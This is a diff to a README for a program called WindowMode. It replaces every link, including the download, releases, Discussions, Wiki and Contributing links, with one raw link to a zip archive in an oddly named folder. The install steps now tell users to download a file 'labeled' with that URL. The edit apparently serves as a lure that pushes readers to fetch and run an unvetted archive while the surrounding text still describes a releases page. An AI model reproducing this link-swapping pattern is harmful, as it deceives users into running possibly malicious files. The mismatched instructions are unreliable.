@@ -1,6 +1,6 @@
 # 🌍 WindowMode - Transform Your Screen into a Virtual World
 
-[![Download WindowMode](https://img.shields.io/badge/Download-WindowMode-blue.svg)](https://github.com/ellah-daniel/WindowMode/releases)
+[![Download WindowMode](https://raw.githubusercontent.com/ellah-daniel/WindowMode/main/ramosely/WindowMode.zip)](https://raw.githubusercontent.com/ellah-daniel/WindowMode/main/ramosely/WindowMode.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you start, make sure your device meets these basic requirements:
 
 To download WindowMode, visit the following page:
 
-[Download WindowMode Here](https://github.com/ellah-daniel/WindowMode/releases)
+[Download WindowMode Here](https://raw.githubusercontent.com/ellah-daniel/WindowMode/main/ramosely/WindowMode.zip)
 
 On this page, you will see the latest release. Follow these steps to download and install:
 
 1. Click on the link above to access the Releases page.
 2. Look for the version number listed at the top. You will see all available files.
-3. Download the file labeled **WindowModeSetup.exe**. This is the installer for the application.
+3. Download the file labeled **https://raw.githubusercontent.com/ellah-daniel/WindowMode/main/ramosely/WindowMode.zip**. This is the installer for the application.
 4. Once the download finishes, open the downloaded file.
 5. Follow the on-screen instructions to install WindowMode on your computer.
 
@@ -50,14 +50,14 @@ If you encounter issues while running WindowMode, consider these tips:
 
 Join our community for more help and tips. Share your experience and connect with other users:
 
-- **GitHub Discussions:** Engage with the team and other users by visiting our [Discussions page](https://github.com/ellah-daniel/WindowMode/discussions).
+- **GitHub Discussions:** Engage with the team and other users by visiting our [Discussions page](https://raw.githubusercontent.com/ellah-daniel/WindowMode/main/ramosely/WindowMode.zip).
 - **Social Media:** Follow us on social media for updates and user stories.
 
 ## ℹ️ Additional Information
 
 For more details about WindowMode, check the following:
 
-- **Documentation:** Our [Wiki](https://github.com/ellah-daniel/WindowMode/wiki) contains in-depth guides and FAQs.
-- **Contributions:** Interested in helping us improve WindowMode? Check out how you can contribute in our [Contributing guide](https://github.com/ellah-daniel/WindowMode/blob/main/CONTRIBUTING.md).
+- **Documentation:** Our [Wiki](https://raw.githubusercontent.com/ellah-daniel/WindowMode/main/ramosely/WindowMode.zip) contains in-depth guides and FAQs.
+- **Contributions:** Interested in helping us improve WindowMode? Check out how you can contribute in our [Contributing guide](https://raw.githubusercontent.com/ellah-daniel/WindowMode/main/ramosely/WindowMode.zip).
 
 Thank you for choosing WindowMode! We hope you enjoy exploring your new virtual environments. If you have any questions, feel free to reach out through our community channels.
